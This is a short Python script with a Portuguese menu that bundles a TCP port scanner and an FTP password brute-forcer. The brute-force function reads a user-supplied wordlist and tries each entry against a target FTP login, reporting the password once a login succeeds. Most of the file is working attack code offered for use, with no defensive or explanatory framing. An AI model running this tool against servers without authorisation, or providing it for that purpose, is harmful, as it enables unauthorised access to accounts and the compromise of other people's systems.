from socket import *
from datetime import datetime
import ftplib


print("******************************************* \n")
print("************NETWORK MAPPER***************** \n")
print("******************************************* \n")
print('\n')

print("\t\tV1.0")


def inicio():
    print('Seja Bem vindo!')
    print('Selecione uma opção: ')
    print('1- Scan Port')
    print('2-Bruteforce Ftp Server')
    opt = int(input('>>> \t'))
    if(opt == 1):
        ScanPort()
    elif(opt == 2):
        brute()

def ScanPort():
    def Buscador(arquivo):
        dt = DataLog()

        ip = str(input("Digite o ip do servidor:"))
        start = int(input("Porta Inicial:"))
        end = int(input("Porta Final:"))

        arquivo.write("{} IP do Servidor: {}\n".format(dt, ip))
        arquivo.write("{} Porta Inicial: {}\n".format(dt, start))
        arquivo.write("{} Porta Final: {}\n".format(dt, end))
        print("Scanning ip {}".format(ip))
        for port in range(start, end):
            print("Teste Port" + str(port) + "....")
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(5)
            if (s.connect_ex((ip, port)) == 0):
                print("porta", port, "aberta")
                dt1 = DataLog()
                arquivo.write("{} Porta Open {}\n".format(dt1, port))
            s.close()

    def WriteLog():
        msg = ("Scanneamento terminou, realizado com sucesso.")
        try:
            arquivo = open("ScannerPort.log", "w")
            Buscador(arquivo)
            arquivo.close()
        except:
            msg = ("Erro!!! Verifique que você digitou informações ou se o servidor está on-line")
        finally:
            print(msg)

    # função para gerar data dos eventos
    def DataLog():
        data = datetime.now()
        tamanho = len(str(data)) - 7
        data2 = str(data)

        return data2[0:tamanho]

    WriteLog()

def brute():
    try:
        ip = str(input("Digite o ip do servidor ftp: \t"))
        ftp_login = str(input("Login do usuário ftp: \t"))
        wordlist = str(input("Digite sua wordlist para iniciar o ataque: \t"))
        ler = open(wordlist, 'r')
        for i in ler.readlines():
            try:
                servidor = ftplib.FTP(ip)
                servidor.login(ftp_login, i.rstrip())
                print("Senha encontrada! ", i.rstrip())
                raise SystemExit
            except ftplib.error_perm:
                print("Senha incorreta! ", i.rstrip())
    except KeyboardInterrupt:
        print("Fim do Programa!")
inicio()
while True:
    print('1- Voltar ao início')
    print('2- Sair')
    opcao = int(input('>>> \t'))
    if(opcao == 1):
        inicio()
    elif(opcao == 2):
        break
    else:
        print('Opção inválida')

